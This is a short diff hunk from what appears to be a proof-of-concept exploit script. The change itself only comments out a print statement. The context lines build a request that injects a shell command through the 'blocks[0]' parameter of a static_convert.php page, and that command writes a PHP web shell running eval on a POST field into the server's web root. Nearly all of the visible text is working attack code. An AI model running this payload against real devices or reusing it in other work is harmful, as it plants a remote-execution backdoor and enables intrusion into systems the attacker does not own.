@@ -69,7 +69,7 @@ class DemoPOC(POCBase):
         result = {}
 
         filename = random_str(6) + ".php"
-        print(filename)
+        # print(filename)
         path="""/view/IPV6/naborTable/static_convert.php?blocks[0]=|echo "<?php echo 'happy day';@eval($_POST[pass]);?>" >>/var/www/html/{}""".format(filename)
         headers={
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
